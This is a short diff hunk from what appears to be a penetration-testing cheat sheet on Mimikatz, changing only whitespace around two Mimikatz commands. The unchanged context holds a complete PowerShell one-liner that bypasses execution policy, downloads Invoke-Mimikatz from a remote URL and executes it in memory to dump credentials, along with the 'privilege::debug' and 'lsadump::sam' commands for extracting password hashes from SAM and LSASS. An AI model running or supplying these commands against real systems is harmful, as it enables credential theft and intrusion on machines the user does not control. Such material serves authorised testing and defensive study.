@@ -248,11 +248,9 @@ Extracts passwords, hashes, PIN codes and kerberos tickets from memory.
 Loading Powershell Script 
 
     powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"    
-    
-    
-    privilege::debug
-    lsadump::sam
-
+   
+    privilege::debug   
+    lsadump::sam   
 
 Dumping credentials from LSASS   
     mimikatz # privilege::debug   
